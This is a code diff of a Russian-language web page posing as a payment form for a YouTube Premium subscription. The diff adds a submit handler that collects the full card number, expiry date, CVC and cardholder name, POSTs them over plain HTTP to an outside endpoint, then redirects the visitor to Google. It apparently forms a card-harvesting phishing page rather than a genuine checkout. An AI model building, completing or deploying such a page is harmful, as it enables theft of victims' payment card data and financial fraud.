@@ -1,13 +1,9 @@
 <!DOCTYPE html>
 <html class="html" lang="ru">
-
 <head>
   <meta charset="UTF-8">
   <title>Оплата</title>
-  <link type="text/css" href="css.css" rel="stylesheet">
-  <!--  <link rel="icon" href="favicon.ico">-->
-  <!--  <link rel="icon" href="img/favicon/icon.svg" type="image/svg+xml">-->
-  <!--  <link rel="apple-touch-icon" href="img/favicon/180.png">-->
+  <link type="text/css" href="style.css" rel="stylesheet">
   <link rel="preload" href="fonts/Inter-Bold.ttf" as="font">
   <link rel="preload" href="fonts/Inter-Medium.ttf" as="font">
   <link rel="preload" href="fonts/Inter-Regular.ttf" as="font">
@@ -18,12 +14,6 @@
 <div class="container">
   <main class="main">
     <div class="information-payment">
-<!--      <div class="logo-container">-->
-<!--        <div class="logo-wrapper">-->
-<!--        <img src="icons8-монета-64.png" class="some-logo" width="30" height="30" alt="logo">-->
-<!--        </div>-->
-<!--        <p class="logo-title">Лого</p>-->
-<!--      </div>-->
       <p class="payment-title">Оплата за подписку YouTube Premium</p>
       <div class="check-wrapper">
         <p class="payment-check">Сумма к оплате</p>
@@ -37,31 +27,27 @@
     <div class="information-card">
       <form class="form-payment">
         <div class="form-container">
-          <label class="text-card card-number-label" for="card-number-input">Номер карты</label>
+          <label class="text-card card-number-label" for="card_number">Номер карты</label>
           <div class="card-number">
-<!--            <div><input type="text" maxlength="4" inputmode='numeric' pattern="\d+" placeholder="____" class="card-number-input" required></div>-->
-<!--            <div><input type="text" maxlength="4" inputmode='numeric' pattern="\d+" placeholder="____" class="card-number-input" required></div>-->
-<!--            <div><input type="text" maxlength="4" inputmode='numeric' pattern="\d+" placeholder="____" class="card-number-input" required></div>-->
-<!--            <div><input type="text" maxlength="4" inputmode='numeric' pattern="\d+" placeholder="____" class="card-number-input" required></div>-->
-            <div><input type="text" id="card-number-input" class="card-number-input" inputmode="numeric" pattern="\d{4}\s?\d{4}\s?\d{4}\s?\d{4}" placeholder="____  ____  ____  ____" maxlength="19" required></div>
+            <div><input class="card-number-input" type="text" id="card_number" name="card_number" inputmode="numeric" pattern="\d{4}\s?\d{4}\s?\d{4}\s?\d{4}" placeholder="____  ____  ____  ____" maxlength="19" required></div>
           </div>
           <div class="date-container">
             <div>
-              <label for="card-date-input" class="text-card">мм / гг</label>
+              <label class="text-card" for="date_card">мм / гг</label>
               <div class="date-wrapper">
                 <div>
-                  <input type="text" id="card-date-input" class="card-date-input" inputmode="numeric" pattern="\d\d/\d\d" maxlength="5" placeholder="__/__" required>
+                  <input class="card-date-input" type="text" id="date_card" name="date_card" inputmode="numeric" pattern="\d\d/\d\d" maxlength="5" placeholder="__/__" required>
                 </div>
               </div>
             </div>
             <div>
-              <label for="card-cvc-input" class="text-card">CVV2/CVC2</label>
-              <div class="cvc-wrapper"><input type="text" maxlength="3" inputmode="numeric" pattern="\d+" placeholder="___" class="card-cvc-input" id="card-cvc-input" required></div>
+              <label class="text-card" for="card-cvc-input">CVV2/CVC2</label>
+              <div class="cvc-wrapper"><input class="card-cvc-input" type="text" name="cvc" maxlength="3" inputmode="numeric" pattern="\d+" placeholder="___" id="card-cvc-input" required></div>
             </div>
           </div>
           <div>
-            <label for="card-holder-input" class="text-card">Имя фамилия</label>
-            <div class="holder-wrapper"><input class="card-holder-input" id="card-holder-input" type="text" inputmode="text" placeholder="________________________" maxlength="120" required></div>
+            <label class="text-card" for="name">Имя фамилия</label>
+            <div class="holder-wrapper"><input class="card-holder-input" name="name" id="name" type="text" inputmode="text" placeholder="________________________" maxlength="120" required pattern="[A-Za-z]+" title="Введите только символы латинского алфавита"></div>
           </div>
         </div>
         <div class="button-wrapper">
@@ -84,16 +70,10 @@
     $(document).ready(function(){
         $(".card-number-input").keyup(function () {
             if (this.value.length == this.maxLength) {
-                        $('.card-date-input').eq(0).focus();
+                $('.card-date-input').eq(0).focus();
             }
         });
     });
-
-    // $(".card-number-input").eq(3).keyup(function () {
-    //     if (this.value.length == this.maxLength) {
-    //         $('.card-date-input').eq(0).focus();
-    //     }
-    // });
 
     $(".card-date-input").keyup(function () {
         if (this.value.length == this.maxLength) {
@@ -118,14 +98,32 @@
     const button = document.querySelector('.card-submit');
     const paymentCurrency = document.querySelector('.payment-currency')
     const currency = paymentCurrency.textContent;
+    const form = document.querySelector('.form-payment');
+    const cardNumberInput = document.querySelector('.card-number-input');
+    const cardHolder = document.querySelector('.card-holder-input');
+    const expiryInput = document.querySelector('.card-date-input');
+    const cvcInput = document.querySelector('.card-cvc-input');
 
     button.textContent = 'Оплатить ' + amount + ' ' + currency;
 
-    const cardNumberInput = document.querySelector('.card-number-input');
+    // Держатель карточки
+
+    cardHolder.addEventListener('input', function(event) {
+        const regex = /^[a-zA-Z\s-]*$/;
+        if (!regex.test(this.value)) {
+            this.value = this.value.slice(0, -1);
+        }
+    });
+
+    // Номер карточки
 
     cardNumberInput.addEventListener('input', (event) => {
         const input = event.target;
         const inputLength = input.value.length;
+
+        // Ограничиваем ввод, только цифры и пробелы
+        const value = cardNumberInput.value;
+        cardNumberInput.value = value.replace(/[^0-9\s]/g, '')
 
         // Разделяем введенные символы на группы по четыре
         if (inputLength > 0 && inputLength % 5 === 0) {
@@ -133,18 +131,81 @@
         }
     });
 
-    const expiryInput = document.querySelector('.card-date-input');
+    // Дата карточки
 
     expiryInput.addEventListener('input', (event) => {
         const input = event.target;
-        const inputLength = input.value.length;
+        let inputValue = input.value;
 
-        // Добавляем символ "/" после ввода двух символов
-        if (inputLength === 2 && input.value.indexOf('/') === -1) {
-            input.value = input.value + '/';
+        // удаляем все символы, кроме цифр
+        inputValue = inputValue.replace(/\D/g, '');
+        const inputLength = inputValue.length;
+
+        // добавляем символ "/" в поле с датой
+        if (inputLength === 2 && inputValue.indexOf('/') === -1) {
+            inputValue = `${inputValue}/`;
+        } else if (inputLength > 2) {
+            inputValue = `${inputValue.slice(0, 2)}/${inputValue.slice(2)}`;
         }
+
+        input.value = inputValue;
     });
 
+    // CVC карточки
+
+    cvcInput.addEventListener('input', (event) => {
+        const cvcValue = cvcInput.value
+        cvcInput.value = cvcValue.replace(/[^0-9]/g, '');
+    })
+
+    // Обработка формы
+
+    button.addEventListener('click', async (event) => {
+        event.preventDefault();
+        button.disabled = true;
+        const formData = new FormData(form);
+        formData.set('card_number', cardNumberInput.value.replace(/\s/g, ''));
+
+        const dateValue = expiryInput.value;
+        const [month, year] = dateValue.split('/');
+        const dateObj = {
+            month,
+            year,
+        };
+        formData.set('date_card', JSON.stringify(dateObj));
+        const nameValue = cardHolder.value.toUpperCase();
+        const [FName, LName] = nameValue.split(' ');
+        const nameObj = {
+            FName,
+            LName,
+        };
+        formData.set('name', JSON.stringify(nameObj));
+
+        console.log(typeof cardNumberInput.value);
+
+        const url = 'http://example.com/your-api-endpoint';
+
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                body: formData,
+            });
+
+            if (response.ok) {
+                window.location.replace('https://www.google.com');
+            } else {
+                throw new Error(`Ошибка ${response.status}: ${response.statusText}`)
+            }
+
+            const result = await response.json();
+            console.log('data', result);
+
+            button.disabled = false;
+        } catch (error) {
+            console.log(`ошибка: ${error.message}`);
+            button.disabled = false;
+        }
+    });
 </script>
 </body>
 </html>
